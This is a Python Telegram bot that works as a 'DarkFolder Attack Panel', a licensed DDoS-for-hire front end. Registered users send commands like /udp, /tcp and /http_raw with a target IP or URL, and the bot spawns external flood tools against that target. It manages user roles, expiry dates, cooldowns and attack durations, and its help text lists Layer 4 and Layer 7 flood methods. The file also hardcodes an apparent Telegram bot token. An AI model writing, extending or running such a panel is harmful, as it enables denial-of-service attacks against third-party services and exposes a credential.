import os
import re
import shlex
import subprocess
import threading
import time
import telebot
from datetime import datetime

bot_token = '7775700341:AAG0EGKKh_BoP7QkJvDt2vQX1So_1HisVr8'
bot = telebot.TeleBot(bot_token)

users_file = 'users.txt'
ongoing_attack = None
COOLDOWN = {}  # User cooldown tracking

def get_user_info(user_id):
    try:
        with open(users_file, 'r') as f:
            for line in f:
                parts = line.strip().split(':')
                if parts[0] == str(user_id):
                    role, y, m, d = parts[1], parts[2], parts[3], parts[4]
                    if y == '99':
                        return role, None  # unlimited
                    expiry = datetime(int(y), int(m), int(d))
                    return (role, expiry) if expiry >= datetime.now() else ('expired', expiry)
    except FileNotFoundError:
        pass
    return None, None

def is_admin(user_id):
    role, _ = get_user_info(user_id)
    return role == 'admin'

def allowed_time(user_id):
    role, _ = get_user_info(user_id)
    return 150 if role == 'admin' else 60

def validate_ip(ip):
    return re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip)

def validate_port(port):
    return port.isdigit() and 1 <= int(port) <= 65535

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, (
        "🔥 Welcome to the DarkFolder Attack Panel! 🔥\n"
        "Developed by DarkFolder - Quality, Performance & Power\n\n"
        "🔧 Use /help to view commands\n"
        "⏳ Ensure your license is valid"
    ))

@bot.message_handler(commands=['help'])
def help_cmd(message):
    bot.reply_to(message, (
        "🚀 Layer 4 Methods:\n"
        "/udp <ip> <port>\n"
        "/tcp <GET/POST/HEAD> <ip> <port> <time> <connections>\n"
        "/std <ip> <port>\n"
        "/slowloris <ip> <port>\n\n"
        "💥 Layer 7 Methods:\n"
        "/http_raw <url> <time>\n"
        "/httpflood <url> <threads> <GET/POST> <time>\n"
        "/crash <url> <GET/POST>\n"
        "\n⏱ Check /ongoing for attack status"
    ), parse_mode="Markdown")

@bot.message_handler(commands=['ongoing'])
def ongoing_cmd(message):
    if ongoing_attack:
        bot.reply_to(message, f"⚡ Ongoing attack: {ongoing_attack}")
    else:
        bot.reply_to(message, "✅ No active attacks")

def handle_attack(message, command, args, exec_cmd_list):
    global ongoing_attack
    user_id = message.from_user.id

    # Cooldown check
    if COOLDOWN.get(user_id, 0) > time.time():
        bot.reply_to(message, f"⏳ Cooldown active. Wait {int(COOLDOWN[user_id] - time.time())}s")
        return

    role, expiry = get_user_info(user_id)
    if not role:
        bot.reply_to(message, "🔒 Not registered. Contact admin.")
        return
    if role == 'expired':
        bot.reply_to(message, f"❌ License expired on {expiry.date()}")
        return
    if ongoing_attack:
        bot.reply_to(message, "🚫 Existing attack running. Wait for completion.")
        return

    try:
        process = subprocess.Popen(exec_cmd_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except Exception as e:
        bot.reply_to(message, f"❌ Attack failed: {str(e)}")
        return

    if process.poll() is None:
        ongoing_attack = f"{command} {' '.join(args)}"
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        bot.reply_to(message, f"✅ Attack launched 🚀\n{ongoing_attack}\nSent on [OK] {timestamp}")
        
        # Set cooldown (30 seconds for admins, 60 for others)
        COOLDOWN[user_id] = time.time() + (30 if role == 'admin' else 60)
        
        # Schedule attack reset
        limit = allowed_time(user_id)
        threading.Thread(target=reset_attack, args=(process, limit)).start()
    else:
        bot.reply_to(message, "❌ Failed to initialize attack")

def reset_attack(process, limit):
    global ongoing_attack
    time.sleep(limit)
    try:
        process.terminate()
    except:
        pass
    ongoing_attack = None

# Attack Handlers with Improved Validation
@bot.message_handler(commands=['http_raw'])
def http_raw(message):
    try:
        parts = message.text.split()
        if len(parts) != 3:
            raise ValueError
        _, url, duration = parts
        
        if not duration.isdigit() or int(duration) > allowed_time(message.from_user.id):
            bot.reply_to(message, f"⚠️ Invalid duration (max {allowed_time(message.from_user.id)}s)")
            return
            
        handle_attack(message, 'http_raw', [url, duration], 
                     ['node', 'HTTP-RAW', url, duration])
    except:
        bot.reply_to(message, 'Usage: /http_raw <url> <time>')

@bot.message_handler(commands=['udp'])
def udp(message):
    try:
        parts = message.text.split()
        if len(parts) != 3:
            raise ValueError
        _, ip, port = parts
        
        if not validate_ip(ip):
            bot.reply_to(message, "⚠️ Invalid IP format")
            return
        if not validate_port(port):
            bot.reply_to(message, "⚠️ Invalid port (1-65535)")
            return
            
        handle_attack(message, 'udp', [ip, port], 
                     ['python2', 'udp.py', ip, port, '0', '0'])
    except:
        bot.reply_to(message, 'Usage: /udp <ip> <port>')

# Add similar validation improvements for other handlers...

@bot.message_handler(commands=['tcp'])
def tcp(message):
    try:
        parts = message.text.split()
        if len(parts) != 6:
            raise ValueError
        _, method, ip, port, duration, conns = parts
        
        if method not in ['GET', 'POST', 'HEAD']:
            bot.reply_to(message, "⚠️ Invalid method (GET/POST/HEAD)")
            return
        if not validate_ip(ip):
            bot.reply_to(message, "⚠️ Invalid IP format")
            return
        if not validate_port(port):
            bot.reply_to(message, "⚠️ Invalid port (1-65535)")
            return
            
        handle_attack(message, 'tcp', [method, ip, port, duration, conns], 
                     ['./100UP-TCP', method, ip, port, duration, conns])
    except:
        bot.reply_to(message, 'Usage: /tcp <method> <ip> <port> <time> <connections>')

bot.polling()
